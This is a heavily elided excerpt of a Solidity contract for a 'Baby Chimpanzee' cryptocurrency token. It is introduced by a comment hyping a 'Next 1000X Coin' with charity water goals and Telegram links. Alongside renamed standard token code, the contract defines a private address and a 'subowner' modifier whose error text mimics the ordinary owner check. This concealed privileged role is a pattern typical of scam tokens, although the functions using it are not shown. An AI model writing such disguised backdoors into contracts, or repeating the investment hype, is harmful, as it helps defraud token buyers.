...
/*
BabyChimpzee 
Next 1000X Coin Baby Chimpanzee (BCZ) is a revolutionary cryptocurrency with a mission 
to make a positive impact on the lives of those in Africa facing water scarcity. 
Inspired by the resilience and playfulness of baby chimpanzees, 
our digital currency is designed to channel the strength of the community 
towards providing clean and sustainable water solutions

https://t.me/+oU9x36veaVg4MTAx
*/
pragma solidity 0.8.23;

interface BabyChimpzee33 {
  /**
...
/*
 * @dev Provides information about the current execution BabyChimpzee20Burnable, including the
 ...
 */
abstract contract BabyChimpzee20Burnable {
...
// File: @openzeppelin/contracts/access/BabyChimpzee20Ownable.sol
 ...
 * the owner.
 */
abstract contract BabyChimpzee20Ownable is BabyChimpzee20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BabyChimpzee20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BabyChimpzee20Ownable: new owner is the zero address");
 ...
 * `SafeBabyChimpzee` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeBabyChimpzee {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeBabyChimpzee: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeBabyChimpzee: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeBabyChimpzee: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeBabyChimpzee: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeBabyChimpzee: modulo by zero");
  }
...
contract BabyChimpzeeToken is BabyChimpzee20Burnable, BabyChimpzee33, BabyChimpzee20Ownable {
    
    using SafeBabyChimpzee for uint256;
   ...
   address private legosRooter; 
    ...
    string public BabyChimpzeethenewstg = "https://t.me/BabyChimpzeeToken";
            function getBabyChimpzeethenewstg() public view returns (string memory) {
        return BabyChimpzeethenewstg;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {BabyChimpzee33-totalSupply}.
    */
    ...
    /**
    * @dev See {BabyChimpzee33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "BabyChimpzee20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BabyChimpzee33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BabyChimpzee33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BabyChimpzee33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {BabyChimpzee33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BabyChimpzee33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "BabyChimpzee33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BabyChimpzee33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "BabyChimpzee33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "BabyChimpzee33: transfer from the zero address");
        require(shippingto != address(0), "BabyChimpzee33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "BabyChimpzee33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "BabyChimpzee33: approve from the zero address");
        require(transporteur != address(0), "BabyChimpzee33: approve to the zero address");
